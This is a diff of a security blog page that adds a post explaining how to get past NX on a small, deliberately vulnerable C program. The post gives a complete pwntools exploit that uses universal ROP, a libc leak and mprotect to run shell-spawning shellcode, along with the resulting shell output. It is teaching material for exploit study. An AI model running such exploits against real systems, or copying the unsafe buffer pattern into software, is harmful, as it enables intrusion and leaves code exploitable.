@@ -4,7 +4,7 @@
          
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>x86</title>
+        <title>Shellcode Injection - Old but gold</title>
         
         <style>
 
@@ -61,9 +61,6 @@
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
  <meta name="generator" content="Hugo 0.55.6" />
         
-        <link href="/tags/x86/index.xml" rel="alternate" type="application/rss&#43;xml" title="raffaeleflorio ~$" />
-        <link href="/tags/x86/index.xml" rel="feed" type="application/rss&#43;xml" title="raffaeleflorio ~$" />
-        
 
         
 
@@ -83,7 +80,7 @@
 
                 <div class="navbar-header">
 
-                    <a class="navbar-brand visible-xs" href="#">x86</a>
+                    <a class="navbar-brand visible-xs" href="#">Shellcode Injection - Old but gold</a>
 
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
@@ -132,9 +129,7 @@
 
 <main>
 
-    <h2>x86</h2>
-
-     <div class="item">
+    <div class="item">
 
     
     
@@ -158,7 +153,220 @@
     
 
 </div>
-  <div class="item">
+
+
+    <br> <div class="text-justify">
+
+<h1 id="intro">Intro</h1>
+
+<p>Some time ago, a friend of mine (<a href="https://dag-tech.github.io/">dag-tech</a>), asked me about a technique to run a shellcode with <code>NX</code> enabled.
+So he gave me a simple program:</p>
+
+<pre><code class="language-c">//src.c
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char **argv) {
+	char buf[16];
+	puts(&quot;Can you pwn me????&quot;);
+	read(0, buf, 512);
+	return 0;
+}
+</code></pre>
+
+<pre><code class="language-shell">$ gcc -z noexecstack -fno-stack-protector -o vuln src.c
+$ checksec vuln
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+
+<h1 id="the-approach">The approach</h1>
+
+<p>The issue with <code>NX</code> is that we cannot execute code in writable memory segment. So we should find a way to disable, post-exploitation, this protection.</p>
+
+<p>Fortunately the <code>mprotect</code> function, in libc, just do this:</p>
+
+<pre><code>NAME
+       mprotect — set protection of memory mapping
+
+SYNOPSIS
+       #include &lt;sys/mman.h&gt;
+
+       int mprotect(void *addr, size_t len, int prot);
+
+DESCRIPTION
+       The mprotect() function shall change the access protections to be that specified by prot for those whole pages containing any part of the address space of the  process  starting  at
+       address  addr  and  continuing for len bytes. The parameter prot determines whether read, write, execute, or some combination of accesses are permitted to the data being mapped. The
+       prot argument should be either PROT_NONE or the bitwise-inclusive OR of one or more of PROT_READ, PROT_WRITE, and PROT_EXEC.
+
+</code></pre>
+
+<p>So here is the plan:</p>
+
+<ul>
+<li>Find a memory segment where we could write the shellcode</li>
+<li>Call mprotect to disable NX on that region</li>
+<li>Jump to that region</li>
+<li>Profit</li>
+</ul>
+
+<p>We write the shellcode starting from the <code>.got.plt</code> segment address.</p>
+
+<h1 id="explotation">Explotation</h1>
+
+<p>Universal ROP is a <em>general techinique</em> to build ROP chain on glibc x86_64 binary.</p>
+
+<p>Basically we use the gadget in the <code>__libc_csu_init</code> function, included by glibc in any x86_64 binary, to populate rdi, rsi and rdx.</p>
+
+<p>These are the first three registers used to pass argument to a function in x86_64 convention.</p>
+
+<p>So we can call any function that accept <em>up</em> to three arguments, like <code>mprotect</code>.</p>
+
+<p>Here the interesting part (so the gadgets..) of <code>__libc_csu_init</code> function:</p>
+
+<pre><code>0x004011b0      4c89f2         mov rdx, r14
+0x004011b3      4c89ee         mov rsi, r13
+0x004011b6      4489e7         mov edi, r12d
+0x004011b9      41ff14df       call qword [r15 + rbx*8]
+0x004011c6      4883c408       add rsp, 8
+0x004011ca      5b             pop rbx
+0x004011cb      5d             pop rbp
+0x004011cc      415c           pop r12
+0x004011ce      415d           pop r13
+0x004011d0      415e           pop r14
+0x004011d2      415f           pop r15
+0x004011d4      c3             ret
+</code></pre>
+
+<p>And here the exploit:</p>
+
+<pre><code class="language-python">#!/usr/bin/python2
+
+from pwn import *
+
+prog = context.binary = ELF(os.getcwd() + &quot;/vuln&quot;, checksec=False)
+
+if len(sys.argv) &gt; 1:
+	host = sys.argv[1]
+	port = 0
+	t = remote(host, port)
+else:
+	t = prog.process()
+	mprotect_offset = 0 # this is libc dependent
+
+offset = 24
+header = &quot;A&quot;*offset
+shellcode = asm(shellcraft.sh())
+gotplt  = prog.get_section_by_name(&quot;.got.plt&quot;).header.sh_addr
+fini_array = prog.get_section_by_name(&quot;.fini_array&quot;).header.sh_addr
+read = prog.plt[&quot;read&quot;]
+puts = prog.plt[&quot;puts&quot;]
+main = prog.symbols[&quot;main&quot;]
+
+prdi     = 0x004011d3 # pop rdi
+
+brdx     = 0x004011ca # pop rbx
+		      # pop rbp
+		      # pop r12
+		      # pop r13
+		      # `pr14 stuff`
+
+pr14     = 0x004011d0 # pop r14
+		      # pop r15
+
+mr14trdx = 0x004011b0 # mov rdx, r14
+		      # mov rsi, r13
+		      # mov edi, r12d
+		      # call qword [r15 + rbx*8]
+		      # add rbx, 1
+		      # cmp rbp, rbx
+		      # jne 0x4011b0 -&gt; SHOULD FAIL
+		      # add rsp, 8
+		      # `brdx stuff`
+
+completedToOne = 0x00401116 # mov byte [obj.completed], 1
+			    # pop rbp
+
+def init_urop():
+	payload = p64(completedToOne)
+	payload += &quot;J&quot;*8
+	return payload
+
+def urop(fn, rdi, rsi=0, rdx=0):
+	payload = &quot;&quot;
+	# set rsi and rdx
+	payload += p64(brdx)
+	payload += p64(0)   #rbx
+	payload += p64(1)   #rbp
+	payload += &quot;J&quot;*8    #r12
+	payload += p64(rsi) #r13
+	payload += p64(rdx) #r14
+	payload += p64(fini_array) #r15
+	payload += p64(mr14trdx)
+	payload += &quot;J&quot;*56
+	# set rdi
+	payload += p64(prdi)
+	payload += p64(rdi)
+	# fn
+	payload += p64(fn)
+	return payload
+
+# stage1: leak puts@libc, so get mprotect@libc.
+
+payload = header
+payload += init_urop()
+payload += urop(puts, prog.got[&quot;puts&quot;])
+payload += p64(main)
+
+t.recvuntil(&quot;Can you pwn me????\n&quot;)
+t.sendline(payload)
+
+puts_libc = u64(t.recvline().replace('\n', '').ljust(8, &quot;\x00&quot;))
+mprotect_libc = puts_libc - mprotect_offset
+log.info(&quot;puts@libc: {:#x}&quot;.format(puts_libc))
+log.info(&quot;mprotect@libc: {:#x}&quot;.format(mprotect_libc))
+
+# stage2: read(0, gotplt, len(shellcode))
+#         mprotect(gotplt, len(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC)
+#         jmp to the shellcode
+payload = header
+payload += urop(read, 0, gotplt, len(shellcode))
+payload += urop(mprotect_libc, gotplt, len(shellcode), 7)
+payload += p64(gotplt)
+
+t.sendline(payload)
+t.sendline(shellcode)
+
+log.success(&quot;DONE&quot;)
+
+t.recvrepeat(0.3)
+t.interactive()
+t.close()
+</code></pre>
+
+<pre><code class="language-shell">$ ./exploit.py
+[+] Starting local process '/path/to/vuln'
+[*] puts@libc: puts_address
+[*] mprotect@libc: mprotect_address
+[+] DONE
+[*] Switching to interactive mode
+$ echo hi
+hi
+$
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+        <h4 class="page-header">Related</h4>
+
+         <div class="item">
 
     
     
@@ -167,7 +375,7 @@
     
     
 
-    <h4><a href="/post/notsoeasyb0f-hackcon19/">HackCon&#39;19 writeup - Not So Easy B0f</a></h4>
+    <h4><a href="/post/babypwn-hackcon19/">HackCon&#39;19 writeup - babypwn</a></h4>
     <h5>September 4, 2019</h5>
     
     <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
@@ -215,7 +423,7 @@
     
     
 
-    <h4><a href="/post/babypwn-hackcon19/">HackCon&#39;19 writeup - babypwn</a></h4>
+    <h4><a href="/post/notsoeasyb0f-hackcon19/">HackCon&#39;19 writeup - Not So Easy B0f</a></h4>
     <h5>September 4, 2019</h5>
     
     <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
@@ -232,9 +440,11 @@
 </div>
  
 
+    
+
+    
+
 </main>
-
-
 
         <footer>
 
